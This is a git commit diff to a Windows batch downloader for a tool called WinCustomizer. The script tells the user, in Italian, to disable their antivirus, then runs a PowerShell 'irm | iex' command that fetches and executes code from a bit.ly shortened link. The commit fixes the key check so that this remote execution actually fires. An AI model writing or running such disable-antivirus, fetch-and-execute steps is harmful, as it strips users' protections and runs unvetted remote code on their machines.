2005db7287c580a45fa0cc2948fc5de825534ebb
MrNico98 <136261932+MrNico98@users.noreply.github.com>
2024-01-26 11:37:40 +0100

    Update DownloadWinCustomizer.bat

--- DownloadWinCustomizer.bat
+++ DownloadWinCustomizer.bat
@@ -13,7 +13,7 @@ if "%errorlevel%" equ "1" ( goto :wincgui )
 :wincgui
 powershell write-host -fore red "Disabilita il tuo antivirus poi premi [y] per continuare"
 choice /C:Y /N
-if "%errorlevel%" equ "2" (
+if "%errorlevel%" equ "1" (
 powershell -command "irm -Uri https://bit.ly/WinCustomizerExe | iex"
 )
 goto :end
